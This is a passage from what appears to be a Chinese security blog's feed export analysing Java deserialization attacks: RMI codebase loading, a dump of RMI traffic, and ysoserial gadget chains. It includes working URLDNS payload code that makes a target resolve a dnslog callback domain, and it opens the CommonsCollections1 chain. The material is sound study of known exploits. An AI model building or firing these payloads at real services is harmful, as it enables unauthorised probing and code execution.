CLASSPATH 下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载 codebase 中的类</p><p>进一步地，控制了<code>codebase</code>，就可以加载远程恶意类</p><p>官方注意到这个问题，满足如下攻击条件 RMI 服务器才能被攻击：</p><ul><li>安装并配置了<code>SecurityManager</code></li><li>Java 版本低于 7u21、6u45，或者高于版本的设置了<code>java.rmi.server.useCodebaseonly=false</code>，其余情况 Java 虚拟机只信任预先配置好的<code>codebase</code>，而不从 RMI 请求获取</li></ul><h4 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h4><p>既然直接找=枚举方法(有害方法)和参数是几乎没有可能利用的，来看看反序列化：RMI 客户端反序列化攻击 RMI 服务端</p><p>首先抓一手流量</p><p>RMI 的第一个<code>call</code>描述了获取远程对象：<code>0xaced</code>后面的就是序列化值，也就是我们的对象名，这个包的意思是获取远程的这个对象</p><p>后面的一个<code>ReturnData</code>就是这个对象的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar SerializationDumper-v1.13.jar <span class="hljs-string">&quot;aced0005770f0144c29b6800000182736d1c688006737d00000002000f6a6176612e726d692e52656d6f7465001a6d796a6176617365632e52 4d49496e7465726661636544656d6f70787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7078707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c65720000000000000002020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e6963617374526566000931302e34342e372e35000004daee738cb6741502bf44c29b6800000182736d1c6880010178&quot;</span><br><br>STREAM_MAGIC - 0xac ed<br>STREAM_VERSION - 0x00 05<br>Contents<br>  TC_BLOCKDATA - 0x77<br>    Length - 15 - 0x0f<br>    Contents - 0x0144c29b6800000182736d1c688006<br>  TC_OBJECT - 0x73<br>    TC_PROXYCLASSDESC - 0x7d<br>      newHandle 0x00 7e 00 00<br>      Interface count - 2 - 0x00 00 00 02<br>      proxyInterfaceNames<br>        0:<br>          Length - 15 - 0x00 0f<br>          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465<br>        1:<br>          Length - 26 - 0x00 1a<br>          Value - myjavasec.RMIInterfaceDemo - 0x6d796a6176617365632e524d49496e7465726661636544656d6f<br>      classAnnotations<br>        TC_NULL - 0x70<br>        TC_ENDBLOCKDATA - 0x78<br>      superClassDesc<br>        TC_CLASSDESC - 0x72<br>          className<br>            Length - 23 - 0x00 17<br>            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879<br>          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb<br>          newHandle 0x00 7e 00 01<br>          classDescFlags - 0x02 - SC_SERIALIZABLE<br>          fieldCount - 1 - 0x00 01<br>          Fields<br>            0:<br>              Object - L - 0x4c<br>              fieldName<br>                Length - 1 - 0x00 01<br>                Value - h - 0x68<br>              className1<br>                TC_STRING - 0x74<br>                  newHandle 0x00 7e 00 02<br>                  Length - 37 - 0x00 25<br>                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b<br>          classAnnotations<br>            TC_NULL - 0x70<br>            TC_ENDBLOCKDATA - 0x78<br>          superClassDesc<br>            TC_NULL - 0x70<br>    newHandle 0x00 7e 00 03<br>    classdata<br>      java.lang.reflect.Proxy<br>        values<br>          h<br>            (object)<br>              TC_OBJECT - 0x73<br>                TC_CLASSDESC - 0x72<br>                  className<br>                    Length - 45 - 0x00 2d<br>                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572<br>                  serialVersionUID - 0x00 00 00 00 00 00 00 02<br>                  newHandle 0x00 7e 00 04<br>                  classDescFlags - 0x02 - SC_SERIALIZABLE<br>                  fieldCount - 0 - 0x00 00<br>                  classAnnotations<br>                    TC_NULL - 0x70<br>                    TC_ENDBLOCKDATA - 0x78<br>                  superClassDesc<br>                    TC_CLASSDESC - 0x72<br>                      className<br>                        Length - 28 - 0x00 1c<br>                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374<br>                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e<br>                      newHandle 0x00 7e 00 05<br>                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE<br>                      fieldCount - 0 - 0x00 00<br>                      classAnnotations<br>                        TC_NULL - 0x70<br>                        TC_ENDBLOCKDATA - 0x78<br>                      superClassDesc<br>                        TC_NULL - 0x70<br>                newHandle 0x00 7e 00 06<br>                classdata<br>                  java.rmi.server.RemoteObject<br>                    values<br>                    objectAnnotation<br>                      TC_BLOCKDATA - 0x77<br>                        Length - 50 - 0x32<br>                        Contents - 0x000a556e6963617374526566000931302e34342e372e35000004daee738cb6741502bf44c29b6800000182736d1c68800101<br>                      TC_ENDBLOCKDATA - 0x78<br>                  java.rmi.server.RemoteObjectInvocationHandler<br>                    values<br>      &lt;Dynamic Proxy Class&gt;<br></code></pre></td></tr></table></figure><p>其中一个<code>classAnnotations</code>是序列化<code>objectOutputStream.annotateClass()</code>中设置的，序列化后的数据要放自定义的数据，只需要重写这个方法；也就是说，分析序列化数据的时候，看到的<code>classAnnotations</code>就是<code>annotateClass</code>写入的数据</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gadget Java</title>
    <link href="/2023/03/15/Gadget%20Java/"/>
    <url>/2023/03/15/Gadget%20Java/</url>
    
    <content type="html"><![CDATA[<h1 id="Gadget-Java"><a href="#Gadget-Java" class="headerlink" title="Gadget Java"></a>Gadget Java</h1><p>基于 Chris Frohoff 工具，<a href="https://github.com/frohoff/ysoserial">ysoserial</a>研究系列的利用链，在<code>GeneratePayload</code>调用每一个链的<code>getObject</code>方法</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>作为 DNS 查询，URLDNS 不需要依赖第三方包，也不受 jdk 版本限制，常用于检测反序列化(在目标没有回显时探测)；不能命令执行，只能作为 DNS 请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br><br>                HashMap ht = <span class="hljs-keyword">new</span> HashMap(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>HashMap.readObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>            <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>            <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>读取键值对并且<code>put</code>进<code>mapping</code>过程中，进行了<code>putVal</code>，对<code>key</code>进行了<code>hash</code>计算，进一步跟进<code>hash</code>方法发现，对<code>key</code>进行了<code>hashCode</code>的计算，这会触发一次 DNS 请求，这点可以验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://r5z2ag.ceye.io/&quot;</span>);<br><br>Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hc.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//hc.set(url,123);</span><br>hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br><span class="hljs-comment">//hc.set(url,-1);</span><br><br><span class="hljs-comment">//hc.set()的作用是在调用put方法前修改hashCode为其他数值，调用put方法后再将hashCode修改回来，避免发起DNS请求</span><br></code></pre></td></tr></table></figure><p>会缓存<code>hashCode</code>则可以换个 dnslog 平台进行验证</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png"></p><p><code>key.hashCode</code>中，<code>key</code>是可控的(来自<code>readObject</code>读取到的)，当然要满足条件<code>mappings &gt; 0</code>即序列化流不为空</p><p>那为什么会调用 URL，因为<code>HashMap.put(url,&#39;anything&#39;)</code>url 属于<code>java.net.URL</code>对象</p><p>那么跟进<code>key</code>对象即<code>java.net.URL</code>的<code>hashCode</code>方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818204044179.png"></p><p>第一个条件肯定跳过了，<code>handler</code>是<code>URLStreamHandler</code>的实例(上面有定义)，跟进发现根据协议<code>InetAddress addr = getHostAddress(u)</code>，进一步<code>u.hostAddress = InetAddress.getByName(host)</code>也就是根据域名查询 ip 即一次 DNS 请求</p><p>至此，整个利用链也很明显</p><blockquote><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl">getByName:<span class="hljs-number">1077</span>, InetAddress (java.net)<br>getHostAddress:<span class="hljs-number">442</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">359</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">885</span>, URL (java.net)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>main:<span class="hljs-number">19</span>, Test (ysoserial)<br><br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>readObject()<br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>hash()<br>URL-&gt;hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>getHostAddress()<br>I<span class="hljs-function"><span class="hljs-title">netAddress</span>-&gt;</span>getByName()<br>上面的调用栈是ysoserial导出来的，重写了SilentURLStreamHandler，因此略微有些不同<br></code></pre></td></tr></table></figure></blockquote><p>序列化并输出文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://ir2jn4.dnslog.cn/&quot;</span>);<br><br>        Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hc.setAccessible(<span class="hljs-keyword">true</span>);<br>        hc.set(url,<span class="hljs-number">123</span>);<br>        hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br>        hc.set(url,-<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//输出到文件</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            FileOutputStream outputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectOutputStream outputStream1 = <span class="hljs-keyword">new</span> ObjectOutputStream(outputStream);<br>            outputStream1.writeObject(hm);<br>            outputStream.close();<br>            outputStream1.close();<br>            FileInputStream inputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>            objectInputStream.readObject();<br>            objectInputStream.close();<br>            inputStream.close();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对生成的文件进行反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeA</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:\\program\\java\\javasec\\ysoserial-master\\2.ser&quot;</span>)));<br>            ois.readObject();<br>            ois.close();<br>            System.out.println(<span class="hljs-string">&quot;URLDNS is cached&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>触发基本都很稳定，但是再一次反序列化就不会被 dnslog 记录到，换一个平台则又可以，暂时不清楚是否与缓存有关</p></blockquote><p>上边是利用了反射修改属性的方式，再看看一开始展示 ysoserial 的生成 Payload</p><p>在<code>GeneratePayload</code>调用 URLDNS 对象中的<code>getObject</code>方法：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getHostAddress:</span><span class="hljs-number">84</span>, URLDNS<span class="hljs-number">$SilentURLStreamHandler</span> (ysoserial.payloads) //空实现，不请求DNS<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">359</span>, URLStreamHandler (java.net)<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">885</span>, URL (java.net)<br><span class="hljs-symbol">hash:</span><span class="hljs-number">339</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">612</span>, HashMap (java.util)<br><span class="hljs-symbol">getObject:</span><span class="hljs-number">57</span>, URLDNS (ysoserial.payloads)<br><span class="hljs-symbol">main:</span><span class="hljs-number">34</span>, GeneratePayload (ysoserial)<br></code></pre></td></tr></table></figure><p>调用继承子类的重写方法<code>SilentURLStreamHandler.getHostAddress</code>，返回了 null 值，因此不触发 DNS 请求(其中序列化时 handler 是<strong>transient</strong>修饰的，因此不会存储在序列化数据中；而反序列化调用的时默认的 handler，也没有重写的<code>getHostAddress</code>方法，也就不影响进行 DNS 请求)</p><p>另外还重写了<code>openConnection</code>是因为继承的<code>URLStreamHandler</code>是抽象类，因此必须重写所有(也就一个)抽象方法</p><h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk1.7 &lt; 8u71</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span 